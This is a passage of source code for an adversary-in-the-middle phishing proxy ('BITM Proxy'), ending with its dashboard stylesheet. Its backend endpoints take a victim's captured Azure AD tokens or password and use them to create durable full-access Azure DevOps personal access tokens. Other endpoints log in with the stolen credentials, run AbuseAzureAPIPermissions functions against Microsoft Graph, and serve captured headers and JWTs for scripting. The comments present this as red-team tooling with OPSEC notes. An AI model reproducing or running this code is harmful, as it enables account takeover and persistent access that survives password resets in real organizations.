         caller-supplied `access_token`, or a ROPC grant of
         username+password (client defaults to the Azure CLI public client,
         which carries ADO delegated permission).
      2. If no `organization` given, discover the account's orgs via the
         vssps profile + accounts APIs (returns the full list; uses the
         first).
      3. POST the PAT Lifecycle API to create the token.

    Why this is a finding, not a utility: a PAT is durable credential
    material that outlives the victim's password reset and is frequently
    outside the Conditional Access / MFA re-evaluation that gates
    interactive sign-in — the same class of coverage gap as ROPC and the
    Phantom Join chain. `scope: app_token` = full-access, `all_orgs: true`
    = every org the identity can reach.

    Gated by enable_token_testing (creates a real AAD sign-in log entry and
    a real, listable PAT in the target org)."""
    from backend.shared import get_config_value as _gcv
    if not _gcv("enable_token_testing", True):
        return {"error": "Token testing disabled (enable_token_testing=false). "
                "This creates Azure AD sign-in log entries and a real PAT. "
                "Enable in Configuration."}
    import datetime
    import httpx  # used by step 3 (PAT creation POST)

    _sid = (body.get("site_id") or "").strip()  # used by step 3's flow recording

    # --- 1. acquire an ADO-scoped AAD token -------------------------------
    tok_res = await _acquire_ado_token(body)
    if not tok_res.get("ok"):
        # Failure dict already carries "stage"/aadsts_code — surface verbatim.
        return tok_res
    token = tok_res["token"]
    token_source = tok_res["token_source"]
    headers = {"Authorization": f"Bearer {token}"}

    # --- 2. resolve the target org ----------------------------------------
    organization = (body.get("organization") or "").strip()
    if not organization:
        # Fall back to the configured default (Settings → Azure / ADO defaults)
        # before auto-discovering, so API/external callers that bypass the
        # dashboard panel still honor `default_ado_org`.
        organization = str(_gcv("default_ado_org", "") or "").strip()
    discovered_orgs: list[str] = []
    if not organization:
        disc = await _discover_ado_orgs(token, token_source)
        if not disc.get("ok"):
            return disc
        discovered_orgs = disc["orgs"]
        if not discovered_orgs:
            return {"error": "No Azure DevOps organizations found for this account. "
                    "Supply `organization` explicitly if you know one.",
                    "stage": "discovery", "token_source": token_source}
        organization = discovered_orgs[0]

    # --- 3. create the PAT ------------------------------------------------
    display_name = (body.get("display_name") or "bitm-proxy").strip()
    pat_scope = (body.get("scope") or "app_token").strip()
    all_orgs = bool(body.get("all_orgs"))
    try:
        valid_days = int(body.get("valid_days") or 90)
    except (TypeError, ValueError):
        valid_days = 90
    valid_to = (datetime.datetime.now(datetime.timezone.utc)
                + datetime.timedelta(days=valid_days)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
    pat_body = {"displayName": display_name, "scope": pat_scope,
                "validTo": valid_to, "allOrgs": all_orgs}
    url = f"https://vssps.dev.azure.com/{organization}/_apis/tokens/pats?api-version=7.1-preview.1"
    import json as _json
    try:
        # 30s for the same vssps-handshake-latency reason as the discovery call.
        async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
            resp = await client.post(url, headers={**headers, "Content-Type": "application/json"},
                                      json=pat_body)
            resp_text = resp.text
            try:
                resp_body = resp.json()
            except Exception:
                resp_body = {"raw": resp_text[:2000]}
    except Exception as e:
        _record_test_flow(_sid, "adopat", "POST", url,
                          {"Authorization": "Bearer <ADO-token>", "Content-Type": "application/json"},
                          _json.dumps(pat_body), 0, {}, f"error: {e}")
        return {"error": str(e), "stage": "create", "organization": organization,
                "token_source": token_source}
    _record_test_flow(_sid, "adopat", "POST", url,
                      {"Authorization": "Bearer <ADO-token>", "Content-Type": "application/json"},
                      _json.dumps(pat_body), resp.status_code, dict(resp.headers), resp_text)

    pt = resp_body.get("patToken") if isinstance(resp_body, dict) else None
    if resp.status_code < 300 and pt and pt.get("token"):
        append_log("warn", "auth_proxy",
                   f"ADO_PAT_CREATED org={organization} name={display_name} "
                   f"scope={pat_scope} all_orgs={all_orgs} valid_days={valid_days} "
                   f"authz_id={pt.get('authorizationId')}")
        return {"ok": True, "status_code": resp.status_code,
                "pat": pt.get("token"),
                "organization": organization,
                "organizations": discovered_orgs,
                "display_name": pt.get("displayName"),
                "scope": pt.get("scope"),
                "valid_to": pt.get("validTo"),
                "valid_from": pt.get("validFrom"),
                "authorization_id": pt.get("authorizationId"),
                "token_source": token_source}

    # PAT API reports per-request failures in patTokenError, not always HTTP status.
    pat_err = (resp_body.get("patTokenError") if isinstance(resp_body, dict) else None) or ""
    append_log("warn", "auth_proxy",
               f"ADO_PAT_FAILED org={organization} status={resp.status_code} err={pat_err}")
    return {"ok": False, "status_code": resp.status_code, "stage": "create",
            "organization": organization, "organizations": discovered_orgs,
            "error": pat_err or (resp_body.get("message") if isinstance(resp_body, dict) else None)
                     or f"PAT creation failed (HTTP {resp.status_code})",
            "token_source": token_source}


@app.get("/api/aaa/info")
async def api_aaa_info():
    """Probe whether the AbuseAzureAPIPermissions runner can fire — checks
    pwsh is on PATH, the vendored script is present, and lists the
    allowlisted functions. Used by the dashboard's AAA panel to decide
    whether to enable itself."""
    from backend import aaa_runner as _aaa
    return _aaa.info()


@app.post("/api/aaa/run")
async def api_aaa_run(body: dict):
    """Body: {site_id, function, args?, token_index?}. See aaa_runner.run.

    OPSEC: hits Microsoft Graph with a captured token — every call lands in
    Azure AD sign-in logs. Functions outside aaa_runner.allowed_functions
    in sites.yaml are rejected.
    """
    from backend import aaa_runner as _aaa
    site_id = (body.get("site_id") or "").strip()
    function = (body.get("function") or "").strip()
    args = body.get("args") or []
    token_index = body.get("token_index")
    if not site_id or not function:
        return {"ok": False, "error": "site_id and function are required"}
    data = credentials_store.get(site_id)
    if not data:
        return {"ok": False, "error": f"no credentials for site_id={site_id!r}"}
    res = await _aaa.run(site_id, data, function, args, token_index)
    # AAA runs pwsh against Graph (not a single HTTP call we can capture), so
    # record a synthetic entry: the function + args as the "request", the
    # captured stdout as the "response".
    import json as _json
    _record_test_flow(
        site_id, "aaa", "AAA", f"aaa://{function}",
        {}, _json.dumps({"function": function, "args": args}),
        res.get("exit_code") if isinstance(res, dict) else None,
        {}, (res.get("stdout") or res.get("error") or "") if isinstance(res, dict) else "")
    return res


@app.post("/api/aaa/login")
async def api_aaa_login(body: dict):
    """Body: {site_id, user, password, tenant_id, service_principal?}.

    Acquires a Graph token via Get-AAATokenFromAzLogin (Connect-AzAccount
    under the hood — requires Az.Accounts PowerShell module). On success
    appends the token to credentials_store[site_id].tokens so the AAA
    runner can use it for downstream Get-AAA* calls.

    OPSEC: hits login.microsoftonline.com with operator-supplied
    credentials — every call is an interactive sign-in event in the
    target tenant's logs.
    """
    from backend import aaa_runner as _aaa
    site_id = (body.get("site_id") or "").strip()
    user = (body.get("user") or "").strip()
    password = body.get("password") or ""
    tenant_id = (body.get("tenant_id") or "").strip()
    # Default to a USER login (no -ServicePrincipal). Captured creds are user
    # email/password; -ServicePrincipal is only correct when User is an app
    # (client) ID + secret. Callers opt in explicitly.
    sp = bool(body.get("service_principal", False))
    if not site_id:
        return {"ok": False, "error": "site_id is required"}
    return await _aaa.acquire_token_via_az_login(
        site_id, user, password, tenant_id,
        service_principal=sp, persist=True,
    )


@app.post("/api/aaa/store-token")
async def api_aaa_store_token(body: dict):
    """Persist a device-code-acquired Graph token onto a credential record so
    the AAA runner can use it (its Token dropdown). Used by the AAA login
    panel's device-code method, which mints the token via
    /api/ado-devicecode/{start,poll} with a Graph scope — the interactive,
    MFA-satisfying alternative to Connect-AzAccount. Body:
    {site_id, access_token, tenant_id?}."""
    from backend.shared import get_config_value as _gcv
    if not _gcv("enable_token_testing", True):
        return {"ok": False, "error": "Token testing disabled (enable_token_testing=false)."}
    site_id = (body.get("site_id") or "").strip()
    token = (body.get("access_token") or "").strip()
    if not site_id or not token:
        return {"ok": False, "error": "site_id and access_token required"}
    from backend import aaa_runner as _aaa
    ok = await _aaa.persist_captured_token(
        site_id, token, body.get("source") or "device-code",
        (body.get("tenant_id") or "").strip())
    return {"ok": ok, "persisted": ok}


@app.post("/api/analyze-flow")
async def api_analyze_flow(body: dict):
    """Stream an Ollama flow analysis as NDJSON (one JSON object per line):
    {"type":"chunk","delta":...} per token batch, then a terminal
    {"type":"done", ...analyze_flow result...} or {"type":"error","error":...}.

    Replaces the old WebSocket analyze path: a fresh HTTP request per run, so a
    backend restart fails cleanly in the browser (fetch errors) instead of
    stranding a zombie socket — that was the analysis-hang class. The
    backend->Ollama leg is unchanged (analyze_flow's httpx streaming call)."""
    import asyncio as _asyncio
    import json as _json
    from fastapi.responses import StreamingResponse
    from backend.ollama_hook import analyze_flow

    session_id = (body.get("session_id") or "").strip()
    preset = (body.get("preset") or "general").strip()
    start_seq = body.get("start_seq")
    end_seq = body.get("end_seq")
    seqs = body.get("seqs")

    async def _gen():
        if not session_id:
            yield _json.dumps({"type": "error", "error": "session_id required"}) + "\n"
            return
        q: _asyncio.Queue = _asyncio.Queue()

        async def on_chunk(delta):
            await q.put({"type": "chunk", "delta": delta})

        async def _run():
            try:
                res = await analyze_flow(session_id, start_seq=start_seq,
                                         end_seq=end_seq, seqs=seqs,
                                         preset=preset, on_chunk=on_chunk)
                await q.put({"type": "done", **(res or {})})
            except Exception as e:
                await q.put({"type": "error", "error": f"{type(e).__name__}: {e}"})
            finally:
                await q.put(None)

        task = _asyncio.create_task(_run())
        try:
            while True:
                item = await q.get()
                if item is None:
                    break
                yield _json.dumps(item, default=str) + "\n"
        finally:
            if not task.done():
                task.cancel()

    return StreamingResponse(_gen(), media_type="application/x-ndjson")


@app.get("/api/headers")
async def api_all_headers():
    """Get all captured headers across all sites."""
    result = {}
    for key in credentials_store.list_keys():
        data = credentials_store.get(key)
        if data and data.get("captured_headers"):
            result[key] = data["captured_headers"]
    return result


@app.get("/api/headers/{site_id}")
async def api_site_headers(site_id: str):
    """Get captured headers for a specific site."""
    data = credentials_store.get(site_id)
    if not data or not data.get("captured_headers"):
        return {}
    return data["captured_headers"]


@app.get("/api/headers/{site_id}/{header_name}")
async def api_header_value(site_id: str, header_name: str):
    """Get a specific captured header value (returns plain text for easy scripting)."""
    from fastapi.responses import PlainTextResponse
    data = credentials_store.get(site_id)
    if not data or not data.get("captured_headers"):
        return PlainTextResponse("", status_code=404)
    # Case-insensitive lookup
    for name, info in data["captured_headers"].items():
        if name.lower() == header_name.lower():
            return PlainTextResponse(info["value"])
    return PlainTextResponse("", status_code=404)


@app.get("/api/latest-headers")
async def api_latest_headers():
    """Get the most recent value for each header name across all sites."""
    latest: dict = {}
    for key in credentials_store.list_keys():
        data = credentials_store.get(key)
        if not data or not data.get("captured_headers"):
            continue
        for name, info in data["captured_headers"].items():
            ts = info.get("captured_at", 0)
            if name not in latest or ts > latest[name].get("captured_at", 0):
                latest[name] = {**info, "site_id": key}
    return latest


@app.get("/api/current-jwts")
async def api_current_jwts():
    """Get the most current JWT for each site."""
    return get_current_jwts()


@app.get("/api/session-logs")
async def api_list_session_logs():
    """List all per-session log files with metadata."""
    return list_session_logs()


@app.get("/api/session-logs/{session_id}")
async def api_get_session_log(session_id: str):
    """Get the full log for a specific session."""
    from fastapi.responses import PlainTextResponse
    content = read_session_log(session_id)
    if content is None:
        return PlainTextResponse("Session log not found", status_code=404)
    return PlainTextResponse(content)


DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BITM Proxy — Debug</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a1a;color:#e2e8f0;font-family:'SF Mono','Consolas',monospace;font-size:14px}

.header{background:#111128;border-bottom:1px solid #333;padding:8px 16px;display:flex;align-items:center;gap:12px}
.header h1{font-size:17px;color:#7dd3fc;font-weight:600}
.badge{font-size:13px;padding:3px 10px;border-radius:8px}
.badge-live{background:#22c55e33;color:#4ade80;border:1px solid #22c55e55}
.badge-dead{background:#ef444433;color:#f87171;border:1px solid #ef444455}

.tab-bar{display:flex;border-bottom:1px solid #333;background:#0d0d20;padding:0 8px;overflow-x:auto}
.tab-btn{padding:8px 16px;font-size:14px;color:#94a3b8;cursor:pointer;border:none;background:none;border-bottom:2px solid transparent;font-family:inherit;white-space:nowrap}
.tab-btn:hover{color:#e2e8f0}
.tab-btn.active{color:#7dd3fc;border-bottom-color:#3b82f6}
.tab-btn.session-tab{color:#2dd4bf;position:relative;padding-right:24px}
.tab-btn.session-tab.active{color:#5eead4;border-bottom-color:#14b8a6}
.session-select-wrap{display:inline-flex;align-items:center;color:#2dd4bf;border-bottom:2px solid transparent;padding:0}
.session-select-wrap.active{color:#5eead4;border-bottom-color:#14b8a6}
.session-select{background:transparent;border:none;color:inherit;font-size:14px;font-family:inherit;padding:8px 4px 8px 16px;cursor:pointer;outline:none}
.session-select option{background:#1a1a2e;color:#e2e8f0}
.tab-close{width:20px;height:20px;line-height:20px;text-align:center;border-radius:50%;font-size:14px;color:#8893a7;background:none;border:none;cursor:pointer;font-family:inherit;padding:0;margin-right:6px}
.tab-close:hover{background:#333;color:#f87171}

.flow-layout{display:flex;flex:1;min-height:0;gap:0}
.flow-timeline{flex:1.1;overflow-y:auto;border-right:1px solid #222;background:#0d0d20}

.idx-layout{display:flex;flex:1;min-height:0;gap:0}
.idx-sections{flex:1.3;overflow-y:auto;background:#0d0d20;padding:8px 10px}
.idx-section{margin-bottom:18px}
.idx-section h4{font-size:12px;color:#7dd3fc;text-transform:uppercase;letter-spacing:.5px;margin:0 0 6px 0;padding-bottom:4px;border-bottom:1px solid #1f2937}
.idx-section h4 .idx-count{color:#64748b;font-weight:normal;font-size:11px;margin-left:6px}
.idx-empty{color:#64748b;font-size:12px;font-style:italic;padding:4px 0}
.idx-item{padding:5px 8px;border-radius:3px;cursor:pointer;font-size:13px;font-family:'SF Mono',ui-monospace,monospace;display:flex;align-items:flex-start;gap:6px;border-left:3px solid transparent}
.idx-item:hover{background:#1a1a2e}
.idx-item.selected{background:#1e293b;border-left-color:#3b82f6}
.idx-group{margin:2px 0 6px 0}
.idx-group-head{display:flex;align-items:center;gap:6px;font-size:12px;padding:4px 6px;background:#10101e;border-radius:3px;cursor:default;font-family:'SF Mono',ui-monospace,monospace;user-select:none}
.idx-group-head .idx-gname{color:#e2e8f0;font-weight:600}
.idx-group-head .idx-gmeta{color:#64748b;font-size:11px}
.idx-group-head .idx-gcaret{color:#64748b;cursor:pointer;width:14px;text-align:center}
.idx-group-head.ignored{opacity:.5}
.idx-group-body{margin-left:18px;border-left:1px dashed #1e293b;padding-left:8px}
.idx-item.idx-sub .idx-item-name{display:none}
.idx-item.idx-sub{font-size:12px}
.idx-item-name{color:#e2e8f0;min-width:160px;max-width:260px;word-break:break-all;flex:0 0 auto}
.idx-item-val{color:#94a3b8;flex:1;word-break:break-all;max-height:48px;overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}
.idx-item-seqs{display:flex;flex-wrap:wrap;gap:3px;flex:0 0 auto;align-self:center}
.idx-seq-chip{font-size:11px;padding:1px 6px;border-radius:10px;background:#1e3a5f;color:#93c5fd;cursor:pointer;border:1px solid transparent}
.idx-seq-chip:hover{background:#3b82f6;color:#fff}
.idx-seq-chip.current{background:#3b82f6;color:#fff;border-color:#60a5fa}
.idx-detail{width:300px;border-left:1px solid #222;background:#0d0d20;padding:12px;overflow-y:auto}
.idx-nav{display:flex;gap:6px;align-items:center;margin-bottom:10px}
.idx-nav button{background:#1e293b;color:#e2e8f0;border:1px solid #334155;padding:4px 10px;border-radius:3px;cursor:pointer;font-size:12px}
.idx-nav button:hover{background:#334155}
.idx-nav button:disabled{opacity:.4;cursor:not-allowed}
.flow-detail{flex:1.4;overflow-y:auto;padding:10px 14px;background:#0a0a18}
.flow-taint{width:260px;border-left:1px solid #222;background:#0d0d20;padding:10px 12px;overflow-y:auto}
.flow-row{display:flex;gap:6px;padding:4px 10px;font-size:13px;border-bottom:1px solid #161628;cursor:pointer;align-items:center;white-space:nowrap;overflow:hidden}
.flow-row:hover{background:#181830}
.flow-row.selected{background:#1e293b;border-left:3px solid #3b82f6}
.flow-row.taint-hit{background:#422006}
.flow-seq{color:#78859b;width:40px;font-family:'SF Mono',monospace;font-size:12px;display:flex;align-items:center;gap:4px}
.flow-seq .flow-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#ef4444;box-shadow:0 0 3px #ef4444}
.flow-row .flow-pick{margin:0 2px 0 0;cursor:pointer;accent-color:#3b82f6}
.flow-row.picked{outline:1px solid #3b82f6;outline-offset:-1px}
.flow-method{font-weight:600;font-size:12px;padding:1px 6px;border-radius:3px;width:52px;text-align:center}
.flow-method.GET{background:#1e3a5f;color:#93c5fd}
.flow-method.POST{background:#3f2f11;color:#fbbf24}
.flow-method.PUT{background:#3f2f11;color:#fbbf24}
.flow-method.DELETE{background:#3f1111;color:#f87171}
.flow-method.OPTIONS,.flow-method.HEAD{background:#2f1f3f;color:#c4b5fd}
.flow-status{width:36px;text-align:center;font-size:12px;font-weight:600}
.flow-status.s2{color:#4ade80}
.flow-status.s3{color:#60a5fa}
.flow-status.s4{color:#fbbf24}
.flow-status.s5{color:#f87171}
.flow-status.pending{color:#78859b}
.flow-url{flex:1;color:#cbd5e1;overflow:hidden;text-overflow:ellipsis}
.flow-dur{color:#78859b;font-size:11px;width:56px;text-align:right;font-family:'SF Mono',monospace}
.flow-detail h3{font-size:13px;color:#7dd3fc;margin:10px 0 6px 0;text-transform:uppercase;letter-spacing:1px}
.flow-detail pre{background:#05050e;border:1px solid #222;border-radius:4px;padding:8px 10px;font-size:12px;color:#cbd5e1;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:320px;overflow-y:auto}
.flow-kv{font-size:12px;color:#94a3b8;font-family:'SF Mono',monospace}
.flow-kv b{color:#e2e8f0;font-weight:600}
.flow-taint h3{font-size:12px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
.taint-chip{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;background:#1e293b;border:1px solid #334155;border-radius:12px;font-size:12px;color:#93c5fd;margin:2px;max-width:100%;overflow:hidden}
.taint-chip b{color:#fbbf24;font-weight:600}
.taint-chip button{background:none;border:none;color:#8893a7;cursor:pointer;padding:0 2px;font-family:inherit}
.taint-chip button:hover{color:#f87171}
.taint-add{display:flex;gap:4px;margin-top:8px}
.taint-add input{flex:1;background:#1a1a2e;border:1px solid #444;color:#e2e8f0;padding:4px 6px;border-radius:4px;font-size:12px;font-family:inherit}
.taint-btn{cursor:pointer;color:#93c5fd;font-size:11px;background:#1e293b;border:1px solid #334155;padding:1px 6px;border-radius:3px;margin-left:4px;font-family:inherit}
.taint-btn:hover{border-color:#3b82f6;color:#7dd3fc}
.flow-toolbar{display:flex;gap:6px;align-items:center;padding:6px 12px;border-bottom:1px solid #222;background:#0d0d20;flex-wrap:wrap}
.flow-ai{background:#0a0a18;border:1px solid #334155;border-radius:4px;padding:10px;margin-top:12px;font-size:13px;color:#cbd5e1;white-space:pre-wrap}
.flow-ai h3{color:#a855f7}
.flow-row.mark-start{box-shadow:inset 3px 0 0 #22c55e}
.flow-row.mark-end{box-shadow:inset 3px 0 0 #ef4444}
.flow-row.mark-start.mark-end{box-shadow:inset 3px 0 0 #22c55e, inset -3px 0 0 #ef4444}
.flow-row.in-range{background:#0a1f14}
.flow-row.in-range:hover{background:#12321c}
.flow-row.in-range.selected{background:#1e402c}
.flow-marker-badge{display:inline-block;padding:0 4px;margin-left:4px;border-radius:2px;font-size:10px;font-weight:600;letter-spacing:0.5px}
.flow-marker-badge.start{background:#22c55e33;color:#4ade80;border:1px solid #22c55e55}
.flow-marker-badge.end{background:#ef444433;color:#f87171;border:1px solid #ef444455}
/* Error rows: prominent red rail + soft red wash so failing transactions
   jump out in Flow Trace, whether the failure is an HTTP 4xx/5xx or a
   body-level code scanned from response_errors rules in sites.yaml. */
.flow-row.flow-err{background:#2a0f11;box-shadow:inset 3px 0 0 #ef4444}
.flow-row.flow-err:hover{background:#3a171a}
.flow-row.flow-err.selected{background:#3f1d22;border-left-color:#ef4444}
.flow-err-badge{display:inline-block;padding:0 5px;margin-left:6px;border-radius:2px;font-size:10px;font-weight:700;letter-spacing:0.3px;background:#7f1d1d;color:#fecaca;border:1px solid #991b1b}
.flow-ms-badge{display:inline-block;padding:0 5px;margin-left:6px;border-radius:3px;font-size:10px;font-weight:700;letter-spacing:0.3px}
.flow-ms-badge.login{background:#0c4a6e;color:#bae6fd;border:1px solid #0369a1}
.flow-ms-badge.code{background:#3b0764;color:#e9d5ff;border:1px solid #6d28d9}
.flow-ms-badge.tokens{background:#064e3b;color:#a7f3d0;border:1px solid #047857}
.flow-ms-badge.refresh{background:#365314;color:#d9f99d;border:1px solid #4d7c0f}
.flow-ms-badge.prt{background:#831843;color:#fecdd3;border:1px solid #be185d}
.flow-ms-badge.session{background:#854d0e;color:#fef08a;border:1px solid #a16207}
.flow-ms-badge.bearer{background:#1e3a8a;color:#bfdbfe;border:1px solid #1d4ed8}
.flow-ms-badge.ca_blocked{background:#7f1d1d;color:#fecaca;border:1px solid #b91c1c}
.flow-ms-badge.ca_reprocess{background:#78350f;color:#fed7aa;border:1px solid #c2410c}
.flow-ms-badge.rp_reject{background:#450a0a;color:#fecdd3;border:1px solid #991b1b}
.flow-ms-badge.mdm_discover{background:#0c4a6e;color:#bae6fd;border:1px solid #0284c7}
.flow-ms-badge.mdm_enroll{background:#134e4a;color:#99f6e4;border:1px solid #0d9488}
.flow-ms-badge.mdm_checkin{background:#1e3a8a;color:#bfdbfe;border:1px solid #2563eb}
.flow-phase-banner{padding:5px 14px;margin:8px 0 2px 0;border-left:3px solid;font-size:12px;font-weight:700;letter-spacing:0.4px;text-transform:uppercase;background:#0a0a18;color:#cbd5e1;border-radius:0 3px 3px 0}
.flow-phase-banner.login{border-left-color:#0369a1;color:#bae6fd;background:linear-gradient(90deg,#0c4a6e22,transparent)}
.flow-phase-banner.code{border-left-color:#6d28d9;color:#e9d5ff;background:linear-gradient(90deg,#3b076422,transparent)}
.flow-phase-banner.tokens{border-left-color:#047857;color:#a7f3d0;background:linear-gradient(90deg,#064e3b22,transparent)}
.flow-phase-banner.refresh{border-left-color:#4d7c0f;color:#d9f99d;background:linear-gradient(90deg,#36531422,transparent)}
.flow-phase-banner.prt{border-left-color:#be185d;color:#fecdd3;background:linear-gradient(90deg,#83184322,transparent)}
.flow-phase-banner.session{border-left-color:#a16207;color:#fef08a;background:linear-gradient(90deg,#854d0e22,transparent)}
.flow-phase-banner.bearer{border-left-color:#1d4ed8;color:#bfdbfe;background:linear-gradient(90deg,#1e3a8a22,transparent)}
.flow-drs-btn{display:inline-block;padding:0 6px;margin-left:6px;border-radius:3px;font-size:10px;font-weight:700;letter-spacing:0.3px;background:#7c2d12;color:#fed7aa;border:1px solid #c2410c;cursor:pointer;font-family:inherit}
.flow-drs-btn:hover{background:#9a3412;color:#fff}
.drs-modal-bg{position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;display:flex;align-items:center;justify-content:center}
.drs-modal{background:#0d0d20;border:1px solid #c2410c;border-radius:6px;padding:18px 22px;max-width:640px;width:90%;color:#cbd5e1;max-height:90vh;overflow:auto}
.drs-modal h3{color:#fed7aa;margin-top:0;font-size:16px}
.drs-modal table{font-size:13px;width:100%;margin:8px 0}
.drs-modal td{padding:3px 8px;border-bottom:1px solid #1e293b}
.drs-modal td:first-child{color:#94a3b8;width:120px}
.drs-modal .danger{background:#7f1d1d;color:#fecaca;padding:8px 12px;border-radius:4px;border-left:3px solid #ef4444;font-size:12px;margin:10px 0}
.drs-modal .ok{background:#064e3b;color:#a7f3d0;padding:8px 12px;border-radius:4px;border-left:3px solid #10b981;font-size:12px;margin:10px 0}
.drs-modal input{background:#1a1a2e;border:1px solid #334155;color:#cbd5e1;padding:4px 8px;border-radius:3px;font-family:inherit;font-size:13px}
.cap-auth{background:#14532d;color:#86efac;padding:0 3px;border-radius:2px;border:1px solid #22c55e55}
.cap-token{background:#3f2f11;color:#fdba74;padding:0 3px;border-radius:2px;border:1px solid #fb923c55}
.cap-oauth{background:#0e4a4d;color:#67e8f9;padding:0 3px;border-radius:2px;border:1px solid #06b6d455}
.cap-cookie{background:#3b1f6e;color:#c4b5fd;padding:0 3px;border-radius:2px;border:1px solid #a855f755}
.cap-legend{display:flex;gap:10px;font-size:11px;color:#78859b;margin:6px 0 10px 0;flex-wrap:wrap}
.cap-legend span{padding:1px 6px;border-radius:2px}

.content{height:calc(100vh - 84px);display:flex}

.sidebar-section h2{font-size:13px;text-transform:uppercase;color:#94a3b8;margin-bottom:8px;letter-spacing:1px}

.settings-layout{display:flex;flex:1;min-height:0}
.settings-nav{width:200px;border-right:1px solid #222;background:#0d0d20;display:flex;flex-direction:column;padding:10px 0;overflow-y:auto}
.settings-tab{background:none;border:none;color:#94a3b8;text-align:left;padding:8px 16px;font-size:13px;cursor:pointer;font-family:inherit;border-left:3px solid transparent}
.settings-tab:hover{color:#e2e8f0;background:#181830}
.settings-tab.active{color:#7dd3fc;border-left-color:#3b82f6;background:#181830}
.settings-content{flex:1;overflow-y:auto;padding:16px 24px}
.settings-pane h2{font-size:15px;color:#7dd3fc;margin-bottom:12px}
.settings-pane h3{font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 6px 0}
.header-launch{display:flex;gap:6px;margin-right:10px}
.header-launch .btn{padding:4px 12px;font-size:13px}

.diag-row{background:#0d0d20;border:1px solid #222;border-radius:4px;padding:10px 14px;margin-bottom:6px}
.diag-row.ok{border-left:3px solid #22c55e}
.diag-row.warn{border-left:3px solid #fbbf24}
.diag-row.fail{border-left:3px solid #ef4444}
.diag-head{display:flex;gap:10px;align-items:center}
.diag-dot{width:10px;height:10px;border-radius:50%;flex:0 0 auto}
.diag-dot.ok{background:#22c55e}
.diag-dot.warn{background:#fbbf24}
.diag-dot.fail{background:#ef4444}
.diag-name{font-weight:600;color:#e2e8f0;font-size:13px}
.diag-msg{color:#cbd5e1;font-size:13px;flex:1;margin-left:4px}
.diag-detail{color:#94a3b8;font-size:12px;font-family:'SF Mono',monospace;white-space:pre-wrap;margin-top:6px;padding-left:20px}

.config-row{display:flex;align-items:center;justify-content:space-between;padding:3px 0}
.config-row label{font-size:13px;color:#cbd5e1}
.toggle{position:relative;width:34px;height:18px;cursor:pointer}
.toggle input{display:none}
.toggle .sl{position:absolute;inset:0;background:#333;border-radius:9px;transition:.2s}
.toggle input:checked+.sl{background:#3b82f6}
.toggle .sl::after{content:'';position:absolute;width:14px;height:14px;background:#fff;border-radius:50%;top:2px;left:2px;transition:.2s}
.toggle input:checked+.sl::after{left:18px}

.cfg-input{background:#1a1a2e;border:1px solid #444;color:#e2e8f0;padding:4px 8px;border-radius:4px;font-size:13px;width:70px;font-family:inherit}
.cfg-input:focus{outline:none;border-color:#3b82f6}
.cfg-input-wide{width:100%;margin-top:4px}

.btn{padding:5px 14px;border-radius:4px;border:1px solid #3b82f6;background:#1e3a5f;color:#93c5fd;cursor:pointer;font-size:13px;font-family:inherit}
.btn:hover{background:#264a72}
.btn-danger{border-color:#ef4444;background:#3f1111;color:#f87171}
.btn-danger:hover{background:#5f1a1a}

.preset-btn{padding:4px 12px;border-radius:4px;border:1px solid #444;background:#1a1a2e;color:#94a3b8;cursor:pointer;font-size:13px;font-family:inherit;margin:2px}
.preset-btn:hover{border-color:#3b82f6;color:#7dd3fc}
.preset-btn.active-preset{border-color:#3b82f6;color:#7dd3fc}

.log-area{flex:1;display:flex;flex-direction:column}
.log-header{padding:6px 16px;border-bottom:1px solid #222;display:flex;align-items:center;justify-content:space-between;background:#0d0d20}
.log-actions{display:flex;gap:8px;align-items:center}
.log-actions button,.log-actions span{padding:4px 12px;border-radius:4px;border:1px solid #444;background:#1a1a2e;color:#cbd5e1;cursor:pointer;font-size:13px;font-family:inherit}
.log-actions button:hover{border-color:#78859b;color:#fff}
.autoscroll{user-select:none}
.autoscroll.on{color:#4ade80!important;border-color:#22c55e55!important}

.filter-bar{padding:6px 12px;border-bottom:1px solid #222;display:flex;gap:4px;flex-wrap:wrap}
.fbtn{padding:3px 10px;border-radius:4px;border:1px solid #444;background:#1a1a2e;color:#94a3b8;cursor:pointer;font-size:13px;font-family:inherit}
.fbtn.active{border-color:#3b82f6;color:#7dd3fc;background:#1e293b}

.log-scroll{flex:1;overflow-y:auto;padding:2px 0}
.ll{padding:2px 16px;font-size:13px;line-height:1.6;white-space:pre-wrap;word-break:break-all}
.ll .seq{display:inline-block;min-width:48px;color:#60a5fa;font-family:'SF Mono',ui-monospace,monospace;font-size:11px;margin-right:6px;text-align:right;cursor:pointer}
.ll .seq:hover{color:#93c5fd;text-decoration:underline}
.ll .seq.empty{color:transparent}
/* Visually nest response-side lines under the matching request */
.ll.resp-side .seq{color:#94a3b8}
.ll.resp-side{padding-left:40px;position:relative}
.ll.resp-side::before{content:"└";position:absolute;left:20px;color:#475569;font-size:11px}
.ll:hover{background:#ffffff08}
.ll .ts{color:#64748b;margin-right:6px}
.ll .sid{color:#78859b;margin-right:4px}
.ll .sid.empty{color:transparent}

.captured-bar{padding:8px 16px;border-bottom:1px solid #222;background:#0a0a14}
.captured-bar h3{font-size:13px;color:#94a3b8;text-transform:uppercase;margin-bottom:4px}
.cap-label{color:#facc15}.cap-val{color:#4ade80}

.c-bearer{color:#34d399;font-weight:bold;background:#064e3b22}
.c-token{color:#4ade80;font-weight:bold}
.c-cookie{color:#fbbf24;font-weight:bold}
.c-auth{color:#f472b6;font-weight:600}
.c-body-auth{color:#a3e635}
.c-error{color:#f87171}
.c-redirect{color:#fb923c}
.c-url{color:#60a5fa}
.c-nav{color:#22d3ee}
.c-heartbeat{color:#333}
.c-step{color:#a78bfa}
.c-req{color:#94a3b8}
.c-resp{color:#94a3b8}
.c-input{color:#facc15;font-weight:bold}
.c-capture{color:#2dd4bf;font-weight:bold}
.c-challenge{color:#fcd34d;font-weight:bold;background:#1f1a08;padding:0 4px;border-radius:2px}
